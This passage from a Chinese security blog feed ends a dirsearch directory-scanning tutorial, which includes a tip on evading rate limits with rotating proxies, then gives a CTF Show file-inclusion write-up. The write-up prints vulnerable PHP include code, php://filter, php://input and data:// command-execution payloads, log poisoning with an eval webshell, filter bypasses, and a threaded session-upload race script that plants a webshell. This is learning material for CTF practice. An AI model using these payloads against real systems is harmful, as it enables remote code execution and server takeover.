-<p>但是在 post 方法中，POST 是万维网使用的 HTTP 支持的请求方法。POST 请求方法在设计上要求 Web 服务器接受包含在请求消息正文中的数据，最有可能存储它。它通常与 GET HTTP 方法一起使用，该方法在名称或值对中用于将表单数据附加到 URL。如果您使用 GET，则 URL 长度将受到限制。这使用户能够提交书签的结果。</p>
-<p>现在，我们正在使用此命令在 [-m] 参数的帮助下探索另一面。</p>
-<p>正如我们所知，与我们之前执行的 GET 请求方法相比，这些结果是不同且独特的。它显示了一些不同的网页和网页目录。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -m POST</span><br></pre></td></tr></table></figure>
-
-<h2 id="延迟请求"><a href="#延迟请求" class="headerlink" title="延迟请求"></a>延迟请求</h2><p>根据规则，或者限制，延迟自己的请求，免除造成不必要的网络拥堵</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -s 10</span><br></pre></td></tr></table></figure>
-
-<h2 id="词表格式"><a href="#词表格式" class="headerlink" title="词表格式"></a>词表格式</h2><p>支持的词表格式：大写、小写、大写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小写</span><br><span class="line">admin</span><br><span class="line">index.html</span><br><span class="line">大写</span><br><span class="line">ADMIN</span><br><span class="line">INDEX.HTML</span><br><span class="line">首部</span><br><span class="line">Admin</span><br><span class="line">Index.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="排除扩展"><a href="#排除扩展" class="headerlink" title="排除扩展"></a>排除扩展</h2><ul>
-<li>使用**-X | –exclude-extensions**带有扩展名列表将删除单词列表中包含给定扩展名的所有路径</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target -X jsp</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.php</span><br><span class="line">test.jsp</span><br><span class="line"></span><br><span class="line">扫描后：</span><br><span class="line">admin.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如果要排除所有扩展名，除了您在<code>-e</code>标志中选择的扩展名，请使用**–only-selected**</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e html -u https://target --only-selected</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">admin.php</span><br><span class="line">扫描后</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="扫描子目录"><a href="#扫描子目录" class="headerlink" title="扫描子目录"></a>扫描子目录</h2><ul>
-<li><strong>从 URL，您可以使用–subdirs</strong>扫描子目录列表。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --subdirs admin/,folder/,/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>它的反向版本是**–exclude-subdirs**，它可以防止 dirsearch 递归扫描给定的子目录。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --recursive --exclude-subdirs image/,css/</span><br></pre></td></tr></table></figure>
-
-<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>dirsearch 支持 SOCKS 和 HTTP 代理，有两个选项：代理服务器或代理服务器列表。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p>支持的报告格式：<strong>simple</strong>、<strong>plain</strong>、<strong>json</strong>、<strong>xml</strong>、<strong>md</strong>、<strong>csv</strong>、 <strong>html</strong></p>
-<p>将扫描变成报告输出出来</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -l URLs.txt --format plain -o report.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --format html -o target.json</span><br></pre></td></tr></table></figure>
-
-<h2 id="没色扫描"><a href="#没色扫描" class="headerlink" title="没色扫描"></a>没色扫描</h2><p>扫描结果是没有颜色的，看个人喜好，毕竟有人喜欢花里胡哨</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ --no-color</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h2><ul>
-<li>服务器有请求限制？这很糟糕，但随意绕过它，通过随机代理<code>--proxy-list</code></li>
-<li>想要找出配置文件或备份？尝试<code>--suffixes ~</code>并<code>--prefixes .</code></li>
-<li>只想查找文件夹&#x2F;目录？为什么不结合<code>--remove-extensions</code>和<code>--suffixes /</code>！</li>
-<li>使用 CIDR 进行暴力破解时，混合使用<code>--cidr</code>、和 将减少大部分噪音 + 假阴性<code>-F``-q</code></li>
-<li>扫描 URL 列表，但不想看到 429 泛滥？<code>--skip-on-status 429</code>将帮助您在返回 429 时跳过目标</li>
-<li>服务器包含会减慢扫描速度的大文件？您<em>可能</em>想使用<code>HEAD</code>HTTP 方法而不是<code>GET</code></li>
-<li>蛮力 CIDR 很慢？可能您忘记减少请求超时和请求重试。建议:<code>--timeout 3 --retries 1</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF Show(文件包含)</title>
-    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本场题目来自于CTF show，本文只是记录学习过程，以及能够提供一点小帮助再好不过</p>
-<p><strong>web78 -web118</strong></p>
-<span id="more"></span>
-
-
-<h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>使用php伪协议php:&#x2F;&#x2F;filter来构造payload</p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</span><br><span class="line"></span><br><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-16469231625671.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image.png" class title="This is an image">
-
-<h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F; 伪协议"></a>file:&#x2F;&#x2F; 伪协议</h2><p><code>file=file:///var/log/nginx/access.log</code>，来确定是否能读取 nginx 的日志。</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_1.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_1.png" class title="This is an image">
-
-<p>确认日志可以访问，对其抓包</p>
-<p>使用Burp进行抓包，并修改 User-Agent 为 <code>&lt;?php @eval($_GET[cmd]);echo PHP_DATADIR;?&gt;</code></p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_2.png" alt="image_2"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_2.png" class title="This is an image">
-
-<p>再次访问可以看到即可查看 PHP 的执行路径。</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_3.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_3.png" class title="This is an image">
-
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=file:///var/log/nginx/access.log&amp;cmd=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_4.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_4.png" class title="This is an image">
-
-<p>也可以直接执行</p>
-<p>pay</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>代码会将php，替换为？？？</p>
-<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>方法同上。利用Burp将恶意代码上传，然后直接进行命令执行。</p>
-<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>我们在网址加上参数 <code>?file=PHP://input</code>，利用burp抓包,添加命令</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_5.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_5.png" class title="This is an image">
-
-<p>修改命令为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>得到flag</p>
-<p><img src="/image/image_6.png"></p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_6.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_6.png" class title="This is an image">
-
-<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>学习到 2 种思路。一是利用特殊的 PHP 语言标记，二是利用编码绕过。</p>
-<h4 id="特殊的-PHP-语言标记"><a href="#特殊的-PHP-语言标记" class="headerlink" title="特殊的 PHP 语言标记"></a>特殊的 PHP 语言标记</h4><p>常见的 PHP 语言标记有如下几种：</p>
-<ul>
-<li><code>&lt;?php phpinfo() ?&gt;</code>：如果只含有 PHP 代码， <code>?&gt;</code> 不允许存在。<code>?&gt;</code> 隐含一个 <code>;</code>，所以最后一句可以不用分号。</li>
-<li><code>&lt;script language=“php”&gt;phpinfo()&lt;script&gt;</code>。</li>
-<li><code>&lt;? ?&gt;</code>：需要修改 PHP 的 <code>short_open_tag</code> 配置</li>
-<li><code>&lt;% %&gt;</code>：默认禁用。</li>
-<li><code>&lt;?=$variablename ?&gt;</code>：默认可用。</li>
-<li><code>&lt;%=$variablename  %&gt;</code>：默认禁用。</li>
-</ul>
-<p>pay</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>将上面的pay改成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>出现 data的话就会被替换掉</p>
-<p><strong>php:&#x2F;&#x2F;input</strong>还可以用，只是目录下的flag.php ——&gt; fl0g.php</p>
-<p>**file:&#x2F;&#x2F;**协议也可以用</p>
-<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 15:51:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>连<code>：</code>都过滤了</p>
-<p>%3A</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?file=data%<span class="number">3</span>A<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
-
-
-<p><strong>Hint</strong>：包含日志文件 进行getshell 日志文件路径： <code>?file=/var/log/nginx/access.log</code></p>
-<p>直接用file：进行命令执行看看</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[cmd]);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_7.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_7.png" class title="This is an image">
-
-<p>需要你自己加上空格（%20），直接加空格就会截断，后面就没办法反应。</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_8.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_8.png" class title="This is an image">
-
-<h1 id="web83-web86"><a href="#web83-web86" class="headerlink" title="web83 - web86"></a>web83 - web86</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 20:28:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>估计是session_destroy()被禁用了，页面显示报错</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>脚本跑不出来</p>
-<p>脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://93a5ba3f-7aea-4855-8fa3-5ecc6311ef67.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">proxy=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url,</span><br><span class="line">            data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        resposne2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    evnet=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>写个上传脚本</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://b9fddb46-a4f3-49d7-a06d-18463c73ebf3.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span 